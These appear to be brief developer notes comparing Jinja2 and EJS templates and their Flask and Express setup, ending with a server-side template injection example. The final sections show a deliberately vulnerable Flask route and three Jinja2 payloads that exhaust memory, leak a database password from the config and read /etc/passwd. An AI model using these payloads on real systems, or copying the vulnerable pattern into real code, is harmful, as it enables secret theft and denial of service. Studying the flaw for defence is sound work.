### Jinja2 Template

```html
<h1>Hello, {{ name }}!</h1>
<ul>
  {% for item in items %}
  <li>{{ item }}</li>
  {% endfor %}
</ul>
```

### EJS Template

```html
<h1>Hello, <%= name %>!</h1>
<ul>
  <% items.forEach(item => { %>
  <li><%= item %></li>
  <% }); %>
</ul>
```

### HTML Output

```html
<h1>Hello, Alice!</h1>
<ul>
  <li>Apples</li>
  <li>Bananas</li>
  <li>Cherries</li>
</ul>
```

### EJS Setup

```js
import express from "express";

const app = express();

app.set("view engine", "ejs");

app.get("/", (_, res) => {
  const data = { name: "Alice", items: ["Apples", "Bananas", "Cherries"] };
  res.render("index", data);
});

app.listen(3000);
```

### Jinja2 Setup

```py
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/")
def home():
    data = {"name": "Alice", "items": ["Apples", "Bananas", "Cherries"]}
    return render_template("index.html", **data)

if __name__ == "__main__":
    app.run(port=3000)
```

### Jinja2 SSTI

```py
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/ssti", methods=["GET"])
def ssti():
    user_input = request.args.get("input", "")
    template = f"Hello {user_input}"
    return render_template_string(template)

if __name__ == "__main__":
    app.run(port=3000)
```

### Jinja2 Payloads

```py
{{ "".join("A" * 10**8) }}
{{ config["DATABASE_PASSWORD"] }}
{{ "".__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read() }}
```
